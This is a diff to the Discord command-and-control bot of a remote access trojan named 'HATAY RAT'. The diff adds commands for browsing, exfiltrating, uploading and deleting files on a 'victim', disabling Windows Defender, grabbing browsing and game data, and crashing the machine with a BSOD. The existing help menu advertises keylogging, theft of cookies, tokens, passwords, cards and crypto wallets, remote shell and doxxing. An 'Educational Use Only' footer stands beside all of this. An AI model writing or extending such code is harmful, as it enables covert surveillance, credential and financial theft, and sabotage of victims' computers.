@@ -97,10 +97,11 @@ bot.remove_command("help")
 def get_help_embed():
     embed = discord.Embed(title="🔴 HATAY RAT - Command Center", color=0xFF0000)
     embed.add_field(name="📊 INFO", value="`!info` `!screenshot` `!camshot` `!targets` `!use <id>`", inline=False)
+    embed.add_field(name="📁 FILES", value="`!ls <path>` `!download <path>` `!upload <url> <name>` `!remove <path>`", inline=False)
     embed.add_field(name="🎬 RECORDING", value="`!vidshot <sec>` `!audio <sec>`", inline=False)
     embed.add_field(name="⌨️ KEYLOGGER", value="`!keylog start` `!keylog stop` `!keylog dump`", inline=False)
-    embed.add_field(name="💀 GRAB", value="`!cookie` `!token` `!pass` `!card` `!crypto` `!dox`", inline=False)
-    embed.add_field(name="⚡ ACTIONS", value="`!shell <cmd>` `!wall <url>` `!shutdown`", inline=False)
+    embed.add_field(name="💀 GRAB", value="`!cookie` `!token` `!pass` `!card` `!crypto` `!dox` `!grab_plus`", inline=False)
+    embed.add_field(name="⚡ ACTIONS", value="`!shell <cmd>` `!wall <url>` `!shutdown` `!defender_off` `!bsod`", inline=False)
     embed.add_field(name="🎭 PRANKS", value="`!stress <sec>` `!troll <message|open|beep|mouse> <val>`", inline=False)
     embed.set_footer(text="HATAY RAT | Educational Use Only")
     return embed
@@ -235,6 +236,48 @@ async def troll(ctx, action: str, *, val: str = ""):
     payload = f"{action}|{val}" if val else action
     queue_command(current_target_id, "troll", payload)
     await ctx.send(f"🎭 Troll `{action}` sent to `{current_target_id}`.")
+
+@bot.command()
+async def ls(ctx, path: str = "."):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "ls", path)
+    await ctx.send(f"📁 Listing files for `{path}`...")
+
+@bot.command()
+async def download(ctx, path: str):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "download", path)
+    await ctx.send(f"📥 Downloading `{path}` from victim...")
+
+@bot.command()
+async def upload(ctx, url: str, filename: str):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "upload", f"{url}|{filename}")
+    await ctx.send(f"📤 Uploading `{filename}` to victim from URL...")
+
+@bot.command()
+async def remove(ctx, path: str):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "remove", path)
+    await ctx.send(f"🗑️ Deleting `{path}` on victim...")
+
+@bot.command()
+async def defender_off(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "defender_off")
+    await ctx.send(f"🛡️ Disabling Windows Defender on `{current_target_id}`...")
+
+@bot.command()
+async def grab_plus(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "grab_plus")
+    await ctx.send(f"🌟 UHQ Grab (History, Games) requested for `{current_target_id}`...")
+
+@bot.command()
+async def bsod(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "bsod")
+    await ctx.send(f"☠️ Triggering BSOD on `{current_target_id}`...")
 
 def queue_command(client_id, type, payload=None):
     if client_id in sessions:
@@ -501,6 +544,9 @@ def run_discord_bot():
             return
         bot_started = True
     try: 
+        if not DISCORD_TOKEN:
+            log_to_gui("❌ Discord Error: No token provided. Set DISCORD_TOKEN environment variable.")
+            return
         bot.run(DISCORD_TOKEN)
     except Exception as e: 
         log_to_gui(f"❌ Discord Error: {e}")
